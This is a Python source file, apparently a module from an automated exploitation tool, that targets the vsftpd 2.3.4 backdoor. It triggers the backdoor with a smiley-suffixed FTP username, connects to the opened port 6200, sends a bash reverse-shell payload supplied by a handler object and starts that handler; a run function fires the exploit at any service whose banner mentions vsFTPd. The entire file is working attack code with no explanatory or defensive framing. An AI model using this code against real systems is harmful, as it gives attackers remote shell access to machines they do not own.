#!/usr/bin/env python3

import os
import sys
import socket
import select
import time

def exploit(args, port, reverse_handler):
    #Stage 1
    s = socket.socket()
    s.settimeout(args.timeout)
    s.connect((args.target, port))
    s.recv(1024)
    print("    \033[1;32m*\033[00m Sending Stage 1: {}:{}".format(args.target, port))
    s.send(b'USER whatever:)\r\n')
    s.recv(1024)
    s.send(b'PASS\r\n')
    s.close()
    #Stage 2
    sock = socket.socket()
    sock.settimeout(args.timeout)
    connection = False
    for i in range(0, 20):
        try:
            sock.connect((args.target, 6200))
            connection = True
            break
        except:
            pass
    if connection:
        sock.send(reverse_handler.payload_BASH.encode('utf-8'))
        reverse_handler.start()
    else:
        exploit(args, port, reverse_handler)

def run(args, data, reverse_handler):
    print("\033[1;34m[*]\033[00m Attempting exploit: VSFTPD 2.3.4")
    for port, banner in data['services']:
        if b'vsFTPd' in banner:
            exploit(args, port, reverse_handler)
    return data
